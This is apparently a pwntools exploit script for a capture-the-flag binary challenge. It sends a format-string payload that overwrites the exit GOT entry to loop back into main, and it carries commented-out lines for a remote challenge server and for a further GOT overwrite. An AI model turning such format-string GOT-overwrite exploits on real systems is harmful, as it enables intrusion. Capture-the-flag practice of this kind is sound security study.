from pwn import *
import sys

elf = ELF("bin/chall_patched")
libc = ELF("lib/libc.so.6")

io = process(elf.path)
# io = remote("65.21.255.31", 33710)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

gdb.attach(io, gdbscript = "b *0x401256")

# ret2main
io.sendlineafter(b"size: ", b"9s%9$sss" + p64(elf.got["exit"]))
# io.sendlineafter(b"data: ", b"A")
io.sendline(p64(elf.sym["_start"]) + p64(elf.sym["main"] + 58))

# # 
# io.sendlineafter(b"size: ", b"9s%9$sss" + p64(elf.got["malloc"]))
# io.sendline(p64(elf.plt["puts"]))

io.interactive()